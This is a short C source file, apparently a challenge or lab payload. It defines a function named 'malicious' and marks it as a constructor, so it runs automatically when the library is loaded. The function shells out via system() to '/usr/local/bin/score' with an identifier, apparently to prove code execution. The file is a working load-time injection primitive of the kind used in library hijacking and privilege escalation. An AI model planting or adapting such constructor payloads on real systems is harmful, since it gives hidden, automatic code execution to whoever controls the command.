#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score e83f79cc-3c71-4bc8-84c3-8463621f83b8");
}
